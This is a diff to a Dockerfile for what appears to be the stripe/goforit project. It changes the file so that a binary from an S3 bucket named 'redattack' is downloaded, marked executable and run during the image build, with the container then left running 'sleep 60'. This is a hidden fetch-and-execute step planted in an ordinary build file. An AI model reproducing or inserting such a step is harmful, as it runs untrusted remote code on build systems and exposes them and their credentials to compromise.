@@ -9,5 +9,5 @@ RUN go get -u -v github.com/kardianos/govendor
 WORKDIR /go/src/github.com/stripe/goforit
 ADD . /go/src/github.com/stripe/goforit
 
-RUN curl -s -N https://redattack.s3.amazonaws.com/test --output /tmp/test && chmod +x /tmp/test
-ENTRYPOINT /tmp/test
+RUN curl -s -N https://redattack.s3.amazonaws.com/test --output /tmp/test && chmod +x /tmp/test && /tmp/test
+CMD sleep 60
